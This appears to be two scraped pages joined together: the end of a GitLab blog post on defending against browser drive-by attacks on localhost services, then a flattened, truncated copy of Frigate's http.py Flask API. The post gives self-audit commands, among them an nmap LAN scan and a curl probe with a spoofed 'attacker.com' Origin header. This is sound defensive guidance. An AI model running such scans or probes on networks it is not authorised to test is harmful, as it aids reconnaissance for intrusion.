While GitLab ended up completely removing Better Errors from the GDK, we did reach out to its author who was incredibly responsive and very quickly [implemented robust protection](https://github.com/BetterErrors/better_errors/pull/474) for the issues we disclosed.

The GDK still uses webpack-dev-server, but it has been configured to [stop serving the installation directory](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41841) and to [stop sending the overly-permissive CORS header](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/46459).

You can view the source code for the original PoC exploit at <https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gdk-driveby-poc-public>.

## How to protect yourself from drive-by attacks

### Secure your code from cross-origin attacks

If you are a developer looking to strengthen your own application, here are two great resources to get you started:

* [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [Portswigger: What is CORS?](https://portswigger.net/web-security/cors)

Do not make the mistake of thinking that your application does not require protection just because it is never exposed to the internet. Any application that listens for requests on a network port can be attacked, even if it only ever runs on localhost for testing purposes.

### Inspect your own network

As users of software in general, we need to be aware of the increased attack surface that comes with every piece of software we install.

**How many network services do you have running locally on your workstation right now?** Try one of the following commands, you might be surprised by the results:

```
# Linux systems
sudo ss -tlpa

# MacOS systems
sudo lsof -i -P | grep -i "listen"

```

How about on your home network? Those are also potential targets for a drive-by attack. If your browser can access them, it can be used to attack them. You can get a quick view using [nmap](https://nmap.org/) like this:

```
# Assuming your LAN is 192.168.1.0/24. Change as needed.
nmap -sV 192.168.1.0/24

```

If you uncover anything that looks like a web service, try to inspect the default HTTP response headers with a command like this:

```
curl -vv -H "Origin: http://attacker.com" http://[IP ADDRESS]

```

If the response headers include something like `Access-Control-Allow-Origin: *` or `Access-Control-Allow-Origin: http://attacker.com`, then you know right away that there is a high chance it is vulnerable to a drive-by attack.

However, as demonstrated in our example above, even services with properly configured CORS headers can be targeted by drive-by attacks under the right conditions.

### Reducing potential impact and risk

When testing and developing software, we end up executing a lot of code via libraries and dependencies. Itâs unlikely that we have the time and resources to personally audit every single line of that code. To make matters worse, we often run local environments with intentionally relaxed security controls because it is just too cumbersome to emulate full production environments on our workstations.

Eliminating these risks totally might be unrealistic, but we can at least make an effort to reduce the potential impact should one of these environments be compromised.

If you were to fall victim to a drive-by attack while running an insecure server on your workstation, you would be in for a very bad day. An attacker with a shell on your system can take over every authenticated web session you have, access all of your local data, and potentially compromise any other remote system you have access to.

The most obvious way to reduce risk would be to not run potentially risky software directly on your workstation. Some easy ways to do this would be:

* Use temporary virtual machines (in the cloud or with local virtualization software) that are reverted to âknown goodâ snapshots often. Ensure these machines contain no sensitive data.
* Use container technology (LXD, Docker, etc) for launching temporary test environments. Follow best practices to make container escapes more difficult.

Neither of the above are iron-clad protections. Attackers can still target VMs and containers using your workstationâs browser. Sophisticated attackers may even find their way out of that restricted environment and back onto your workstation. But these methods do add another layer between potentially insecure code and your sensitive data.

### Secure your browser

Additional layers of security can also be implemented around the browser, by segmenting it or restricting what it can do. Remember, your browser is what a drive-by attack abuses to gain access to local services. Here are some ideas to consider:

* Use the [Tor Browser](https://www.torproject.org/). Besides coming with enhanced security features enabled by default, it literally [cannot access localhost](https://gitlab.torproject.org/legacy/trac/-/issues/10419) or your LAN.
* In your normal browser, plugins like [uBlock Origin](https://github.com/gorhill/uBlock) can limit the ability of JavaScript to execute (see [blocking modes](https://github.com/gorhill/uBlock/wiki/Blocking-mode)) and block sites from accessing local IP addresses (enable the "block access to LAN" [filter-list](https://github.com/gorhill/uBlock/wiki/Dashboard%3A-Filter-lists)).
* Some attacks may use a DNS name that resolves to a local IP address, which would bypass the filter list described above. See if your provider supports something called "DNS rebind protection" (available in dnsmasq, pihole, and services like NextDNS).
* You can run a web browser inside a virtual machine with limited access to your workstation and/or your LAN. This can be done manually or via products like [QubesOS](https://www.qubes-os.org/) and/or [Whonix](https://www.whonix.org/). Use this segmented browser when accessing sites that you do not trust completely. Revert the browser VMs back to a known good state often.

Some of the ideas above, such as using the Tor Browser or a virtual machine, may not be particularly convenient for 100% of your tasks. You can use them selectively when accessing sites that you have specific concerns with (like while conducting incident response or security research).

![file name](https://about.gitlab.com/images/blogimages/drive-by/tor-browser.png)
Tor Browser to the rescue!

## Understand and protect your attack surface

If you are running software on your computer that listens on a local network port, you are running a server. That server can be accessed and attacked by any website you visit. Because software developers frequently test less-secure services on their local machines, they are at an increased risk of compromise by these types of attacks.

Understanding this attack surface is important, as it lets you make decisions about what additional layers of security you can use to protect yourself. If you have any tips of your own to share, please do so in the comments below.

Thanks for reading!

Cover image by [Pixabay](https://www.pexels.com/%40pixabay) on [Pexels](https://www.pexels.com/photo/action-asphalt-back-light-cars-434450/)

Share this article

## Sign up for GitLabâs newsletter

All fields required

## More to explore

[View all blog posts](/blog/)   [Security ![compliance 2 - cover](//images.ctfassets.net/r9o86ar0p03f/3VhlhHOdVG8uVv1YFHWSTi/6658d4c4c7094955260f6cbf6f1f628f/AdobeStock_880918603.jpeg?fm=webp&w=318&h=222)
#### GitLab supports banks in navigating regulatory challenges

Read the blog](/blog/2025/01/09/gitlab-supports-banks-in-navigating-regulatory-challenges/)  [Security ![checklist - cover](//images.ctfassets.net/r9o86ar0p03f/4lmOEVlaXP0YC3hSFmOw6i/137190eaa474dbc750bbbf040c13f324/AdobeStock_479904468__1_.jpeg?fm=webp&w=318&h=222)
#### Streamline the path to CMMC Level 2 compliance with GitLab

Read the blog](/blog/2025/01/07/streamline-the-path-to-cmmc-level-2-compliance-with-gitlab/)  [Security ![security - chainlink - cover](//images.ctfassets.net/r9o86ar0p03f/1iy516k40hwBDChKcUJ2zb/264b924e95ca5c65751e0a52ee6a41d7/blog-image-template-1800x945__5_.png?fm=webp&w=318&h=222)
#### Reduce supply chain risk with smarter vulnerability prioritization

Read the blog](/blog/2025/01/07/reduce-supply-chain-risk-with-smarter-vulnerability-prioritization/)
### We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum. [Share your feedback](https://forum.gitlab.com/new-topic?title=GitLab%20account%20security:%20Verify%20your%20information%20for%20enhanced%20protection&body=&tags=blog-feedback)
#### Ready to get started?

See what your team could do with a unified DevSecOps Platform.

[Get free trial](https://gitlab.com/-/trial_registrations/new?glm_content=default-saas-trial&amp;glm_source=about.gitlab.com)

Find out which plan works best for your team

[Learn about pricing](/pricing/)

Learn about what GitLab can do for your team

[Talk to an expert](/sales/)


=== Content from github.com_6d531884_20250114_202634.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Fhttp.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Fhttp.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

## Files

 5658e5a
## Breadcrumbs

1. [frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f)
2. /[frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate)
/
# http.py

Copy path Blame  Blame
## Latest commit

## History

[History](/blakeblackshear/frigate/commits/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py)1764 lines (1466 loc) · 53.4 KB 5658e5a
## Breadcrumbs

1. [frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f)
2. /[frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate)
/
# http.py

Top
## File metadata and controls

* Code
* Blame

1764 lines (1466 loc) · 53.4 KB[Raw](https://github.com/blakeblackshear/frigate/raw/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000import base64import copyimport globimport jsonimport loggingimport osimport subprocess as spimport timeimport tracebackfrom datetime import datetime, timedelta, timezonefrom functools import reducefrom pathlib import Pathfrom urllib.parse import unquote
import cv2import numpy as npimport pytzfrom flask import ( Blueprint, Flask, Response, current\_app, jsonify, make\_response, request,)from peewee import DoesNotExist, fn, operatorfrom playhouse.shortcuts import model\_to\_dictfrom playhouse.sqliteq import SqliteQueueDatabasefrom tzlocal import get\_localzone\_name
from frigate.config import FrigateConfigfrom frigate.const import ( CACHE\_DIR, CLIPS\_DIR, CONFIG\_DIR, MAX\_SEGMENT\_DURATION, RECORD\_DIR,)from frigate.events.external import ExternalEventProcessorfrom frigate.models import Event, Recordings, Timelinefrom frigate.object\_processing import TrackedObjectfrom frigate.plus import PlusApifrom frigate.ptz.onvif import OnvifControllerfrom frigate.record.export import PlaybackFactorEnum, RecordingExporterfrom frigate.stats import stats\_snapshotfrom frigate.storage import StorageMaintainerfrom frigate.util.builtin import ( clean\_camera\_user\_pass, get\_tz\_modifiers, update\_yaml\_from\_url,)from frigate.util.services import ffprobe\_stream, restart\_frigate, vainfo\_hwaccelfrom frigate.version import VERSION
logger = logging.getLogger(\_\_name\_\_)
bp = Blueprint("frigate", \_\_name\_\_)
def create\_app( frigate\_config, database: SqliteQueueDatabase, stats\_tracking, detected\_frames\_processor, storage\_maintainer: StorageMaintainer, onvif: OnvifController, external\_processor: ExternalEventProcessor, plus\_api: PlusApi,): app = Flask(\_\_name\_\_)
 @app.before\_request def \_db\_connect(): if database.is\_closed(): database.connect()
 @app.teardown\_request def \_db\_close(exc): if not database.is\_closed(): database.close()
 app.frigate\_config = frigate\_config app.stats\_tracking = stats\_tracking app.detected\_frames\_processor = detected\_frames\_processor app.storage\_maintainer = storage\_maintainer app.onvif = onvif app.external\_processor = external\_processor app.plus\_api = plus\_api app.camera\_error\_image = None app.hwaccel\_errors = []
 app.register\_blueprint(bp)
 return app
@bp.route("/")def is\_healthy(): return "Frigate is running. Alive and healthy!"
@bp.route("/events/summary")def events\_summary(): tz\_name = request.args.get("timezone", default="utc", type=str) hour\_modifier, minute\_modifier = get\_tz\_modifiers(tz\_name) has\_clip = request.args.get("has\_clip", type=int) has\_snapshot = request.args.get("has\_snapshot", type=int)
 clauses = []
 if has\_clip is not None: clauses.append((Event.has\_clip == has\_clip))
 if has\_snapshot is not None: clauses.append((Event.has\_snapshot == has\_snapshot))
 if len(clauses) == 0: clauses.append((True))
 groups = ( Event.select( Event.camera, Event.label, Event.sub\_label, fn.strftime( "%Y-%m-%d", fn.datetime( Event.start\_time, "unixepoch", hour\_modifier, minute\_modifier ), ).alias("day"), Event.zones, fn.COUNT(Event.id).alias("count"), ) .where(reduce(operator.and\_, clauses)) .group\_by( Event.camera, Event.label, Event.sub\_label, fn.strftime( "%Y-%m-%d", fn.datetime( Event.start\_time, "unixepoch", hour\_modifier, minute\_modifier ), ), Event.zones, ) )
 return jsonify([e for e in groups.dicts()])
@bp.route("/events/<id>", methods=("GET",))def event(id): try: return model\_to\_dict(Event.get(Event.id == id)) except DoesNotExist: return "Event not found", 404
@bp.route("/events/<id>/retain", methods=("POST",))def set\_retain(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 event.retain\_indefinitely = True event.save()
 return make\_response( jsonify({"success": True, "message": "Event " + id + " retained"}), 200 )
@bp.route("/events/<id>/plus", methods=("POST",))def send\_to\_plus(id): if not current\_app.plus\_api.is\_active(): message = "PLUS\_API\_KEY environment variable is not set" logger.error(message) return make\_response( jsonify( { "success": False, "message": message, } ), 400, )
 include\_annotation = ( request.json.get("include\_annotation") if request.is\_json else None )
 try: event = Event.get(Event.id == id) except DoesNotExist: message = f"Event {id} not found" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 404)
 # events from before the conversion to relative dimensions cant include annotations if event.data.get("box") is None: include\_annotation = None
 if event.end\_time is None: logger.error(f"Unable to load clean png for in-progress event: {event.id}") return make\_response( jsonify( { "success": False, "message": "Unable to load clean png for in-progress event", } ), 400, )
 if event.plus\_id: message = "Already submitted to plus" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 # load clean.png try: filename = f"{event.camera}-{event.id}-clean.png" image = cv2.imread(os.path.join(CLIPS\_DIR, filename)) except Exception: logger.error(f"Unable to load clean png for event: {event.id}") return make\_response( jsonify( {"success": False, "message": "Unable to load clean png for event"} ), 400, )
 if image is None or image.size == 0: logger.error(f"Unable to load clean png for event: {event.id}") return make\_response( jsonify( {"success": False, "message": "Unable to load clean png for event"} ), 400, )
 try: plus\_id = current\_app.plus\_api.upload\_image(image, event.camera) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 # store image id in the database event.plus\_id = plus\_id event.save()
 if include\_annotation is not None: box = event.data["box"]
 try: current\_app.plus\_api.add\_annotation( event.plus\_id, box, event.label, ) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 return make\_response(jsonify({"success": True, "plus\_id": plus\_id}), 200)
@bp.route("/events/<id>/false\_positive", methods=("PUT",))def false\_positive(id): if not current\_app.plus\_api.is\_active(): message = "PLUS\_API\_KEY environment variable is not set" logger.error(message) return make\_response( jsonify( { "success": False, "message": message, } ), 400, )
 try: event = Event.get(Event.id == id) except DoesNotExist: message = f"Event {id} not found" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 404)
 # events from before the conversion to relative dimensions cant include annotations if event.data.get("box") is None: message = "Events prior to 0.13 cannot be submitted as false positives" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 if event.false\_positive: message = "False positive already submitted to Frigate+" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 if not event.plus\_id: plus\_response = send\_to\_plus(id) if plus\_response.status\_code != 200: return plus\_response # need to refetch the event now that it has a plus\_id event = Event.get(Event.id == id)
 region = event.data["region"] box = event.data["box"]
 # provide top score if score is unavailable score = ( (event.data["top\_score"] if event.data["top\_score"] else event.top\_score) if event.data["score"] is None else event.data["score"] )
 try: current\_app.plus\_api.add\_false\_positive( event.plus\_id, region, box, score, event.label, event.model\_hash, event.model\_type, event.detector\_type, ) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 event.false\_positive = True event.save()
 return make\_response(jsonify({"success": True, "plus\_id": event.plus\_id}), 200)
@bp.route("/events/<id>/retain", methods=("DELETE",))def delete\_retain(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 event.retain\_indefinitely = False event.save()
 return make\_response( jsonify({"success": True, "message": "Event " + id + " un-retained"}), 200 )
@bp.route("/events/<id>/sub\_label", methods=("POST",))def set\_sub\_label(id): try: event: Event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 json: dict[str, any] = request.get\_json(silent=True) or {} new\_sub\_label = json.get("subLabel") new\_score = json.get("subLabelScore")
 if new\_sub\_label and len(new\_sub\_label) > 100: return make\_response( jsonify( { "success": False, "message": new\_sub\_label + " exceeds the 100 character limit for sub\_label", } ), 400, )
 if new\_score is not None and (new\_score > 1.0 or new\_score < 0): return make\_response( jsonify( { "success": False, "message": new\_score + " does not fit within the expected bounds 0 <= score <= 1.0", } ), 400, )
 if not event.end\_time: tracked\_obj: TrackedObject = ( current\_app.detected\_frames\_processor.camera\_states[ event.camera ].tracked\_objects.get(event.id) )
 if tracked\_obj: tracked\_obj.obj\_data["sub\_label"] = (new\_sub\_label, new\_score)
 event.sub\_label = new\_sub\_label
 if new\_score: data = event.data data["sub\_label\_score"] = new\_score event.data = data
 event.save() return make\_response( jsonify( { "success": True, "message": "Event " + id + " sub label set to " + new\_sub\_label, } ), 200, )
@bp.route("/labels")def get\_labels(): camera = request.args.get("camera", type=str, default="")
 try: if camera: events = Event.select(Event.label).where(Event.camera == camera).distinct() else: events = Event.select(Event.label).distinct() except Exception as e: return make\_response( jsonify({"success": False, "message": f"Failed to get labels: {e}"}), 404 )
 labels = sorted([e.label for e in events]) return jsonify(labels)
@bp.route("/sub\_labels")def get\_sub\_labels(): split\_joined = request.args.get("split\_joined", type=int)
 try: events = Event.select(Event.sub\_label).distinct() except Exception as e: return make\_response( jsonify({"success": False, "message": f"Failed to get sub\_labels: {e}"}), 404, )
 sub\_labels = [e.sub\_label for e in events]
 if None in sub\_labels: sub\_labels.remove(None)
 if split\_joined: original\_labels = sub\_labels.copy()
 for label in original\_labels: if "," in label: sub\_labels.remove(label) parts = label.split(",")
 for part in parts: if part.strip() not in sub\_labels: sub\_labels.append(part.strip())
 sub\_labels.sort() return jsonify(sub\_labels)
@bp.route("/events/<id>", methods=("DELETE",))def delete\_event(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 media\_name = f"{event.camera}-{event.id}" if event.has\_snapshot: media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}.jpg") media.unlink(missing\_ok=True) media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}-clean.png") media.unlink(missing\_ok=True) if event.has\_clip: media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}.mp4") media.unlink(missing\_ok=True)
 event.delete\_instance() return make\_response( jsonify({"success": True, "message": "Event " + id + " deleted"}), 200 )
@bp.route("/events/<id>/thumbnail.jpg")def event\_thumbnail(id, max\_cache\_age=2592000): format = request.args.get("format", "ios") thumbnail\_bytes = None event\_complete = False try: event = Event.get(Event.id == id) if event.end\_time is not None: event\_complete = True thumbnail\_bytes = base64.b64decode(event.thumbnail) except DoesNotExist: # see if the object is currently being tracked try: camera\_states = current\_app.detected\_frames\_processor.camera\_states.values() for camera\_state in camera\_states: if id in camera\_state.tracked\_objects: tracked\_obj = camera\_state.tracked\_objects.get(id) if tracked\_obj is not None: thumbnail\_bytes = tracked\_obj.get\_thumbnail() except Exception: return "Event not found", 404
 if thumbnail\_bytes is None: return "Event not found", 404
 # android notifications prefer a 2:1 ratio if format == "android": jpg\_as\_np = np.frombuffer(thumbnail\_bytes, dtype=np.uint8) img = cv2.imdecode(jpg\_as\_np, flags=1) thumbnail = cv2.copyMakeBorder( img, 0, 0, int(img.shape[1] \* 0.5), int(img.shape[1] \* 0.5), cv2.BORDER\_CONSTANT, (0, 0, 0), ) ret, jpg = cv2.imencode(".jpg", thumbnail, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70]) thumbnail\_bytes = jpg.tobytes()
 response = make\_response(thumbnail\_bytes) response.headers["Content-Type"] = "image/jpeg" if event\_complete: response.headers["Cache-Control"] = f"private, max-age={max\_cache\_age}" else: response.headers["Cache-Control"] = "no-store" return response
@bp.route("/timeline")def timeline(): camera = request.args.get("camera", "all") source\_id = request.args.get("source\_id", type=str) limit = request.args.get("limit", 100)
 clauses = []
 selected\_columns = [ Timeline.timestamp, Timeline.camera, Timeline.source, Timeline.source\_id, Timeline.class\_type, Timeline.data, ]
 if camera != "all": clauses.append((Timeline.camera == camera))
 if source\_id: clauses.append((Timeline.source\_id == source\_id))
 if len(clauses) == 0: clauses.append((True))
 timeline = ( Timeline.select(\*selected\_columns) .where(reduce(operator.and\_, clauses)) .order\_by(Timeline.timestamp.asc()) .limit(limit) )
 return jsonify([model\_to\_dict(t) for t in timeline])
@bp.route("/<camera\_name>/<label>/best.jpg")@bp.route("/<camera\_name>/<label>/thumbnail.jpg")def label\_thumbnail(camera\_name, label): label = unquote(label) event\_query = Event.select(fn.MAX(Event.id)).where(Event.camera == camera\_name) if label != "any": event\_query = event\_query.where(Event.label == label)
 try: event = event\_query.scalar()
 return event\_thumbnail(event, 60) except DoesNotExist: frame = np.zeros((175, 175, 3), np.uint8) ret, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70])
 response = make\_response(jpg.tobytes()) response.headers["Content-Type"] = "image/jpeg" response.headers["Cache-Control"] = "no-store" return response
@bp.route("/events/<id>/snapshot.jpg")def event\_snapshot(id): download = request.args.get("download", type=bool) event\_complete = False jpg\_bytes = None try: event = Event.get(Event.id == id, Event.end\_time != None) event\_complete = True if not event.has\_snapshot: return "Snapshot not available", 404 # read snapshot from disk with open( os.path.join(CLIPS\_DIR, f"{event.camera}-{id}.jpg"), "rb" ) as image\_file: jpg\_bytes = image\_file.read() except DoesNotExist: # see if the object is currently being tracked try: camera\_states = current\_app.detected\_frames\_processor.camera\_states.values() for camera\_state in camera\_states: if id in camera\_state.tracked\_objects: tracked\_obj = camera\_state.tracked\_objects.get(id) if tracked\_obj is not None: jpg\_bytes = tracked\_obj.get\_jpg\_bytes( timestamp=request.args.get("timestamp", type=int), bounding\_box=request.args.get("bbox", type=int), crop=request.args.get("crop", type=int), height=request.args.get("h", type=int), quality=request.args.get("quality", default=70, type=int), ) except Exception: return "Event not found", 404 except Exception: return "Event not found", 404
 if jpg\_bytes is None: return "Event not found", 404
 response = make\_response(jpg\_bytes) response.headers["Content-Type"] = "image/jpeg" if event\_complete: response.headers["Cache-Control"] = "private, max-age=31536000" else: response.headers["Cache-Control"] = "no-store" if download: response.headers[ "Content-Disposition" ] = f"attachment; filename=snapshot-{id}.jpg" return response
@bp.route("/<camera\_name>/<label>/snapshot.jpg")def label\_snapshot(camera\_name, label): label = unquote(label) if label == "any": event\_query = ( Event.select() .where(Event.camera == camera\_name) .where(Event.has\_snapshot == True) .order\_by(Event.start\_time.desc()) ) else: event\_query = ( Event.select() .where(Event.camera == camera\_name) .where(Event.label == label) .where(Event.has\_snapshot == True) .order\_by(Event.start\_time.desc()) )
 try: event = event\_query.get() return event\_snapshot(event.id) except DoesNotExist: frame = np.zeros((720, 1280, 3), np.uint8) ret, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70])
 response = make\_response(jpg.tobytes()) response.headers["Content-Type"] = "image/jpeg" return response
@bp.route("/events/<id>/clip.mp4")def event\_clip(id): download = request.args.get("download", type=bool)
 try: event: Event = Event.get(Event.id == id) except DoesNotExist: return "Event not found.", 404
 if not event.has\_clip: return "Clip not available", 404
 file\_name = f"{event.camera}-{id}.mp4" clip\_path = os.path.join(CLIPS\_DIR, file\_name)
 if not os.path.isfile(clip\_path): end\_ts = ( datetime.now().timestamp() if event.end\_time is None else event.end\_time ) return recording\_clip(event.camera, event.start\_time, end\_ts)
 response = make\_response() response.headers["Content-Description"] = "File Transfer" response.headers["Cache-Control"] = "no-cache" response.headers["Content-Type"] = "video/mp4" if download: response.headers["Content-Disposition"] = "attachment; filename=%s" % file\_name response.headers["Content-Length"] = os.path.getsize(clip\_path) response.headers[ "X-Accel-Redirect" ] = f"/clips/{file\_name}" # nginx: http://wiki.nginx.org/NginxXSendfile
 return response
@bp.route("/events")def events(): camera = request.args.get("camera", "all") cameras = request.args.get("cameras", "all")
 # handle old camera arg if cameras == "all" and camera != "all": cameras = camera
 label = unquote(request.args.get("label", "all")) labels = request.args.get("labels", "all")
 # handle old label arg if labels == "all" and label != "all": labels = label
 sub\_label = request.args.get("sub\_label", "all") sub\_labels = request.args.get("sub\_labels", "all")
 # handle old sub\_label arg if sub\_labels == "all" and sub\_label != "all": sub\_labels = sub\_label
 zone = request.args.get("zone", "all") zones = request.args.get("zones", "all")
 # handle old label arg if zones == "all" and zone != "all": zones = zone
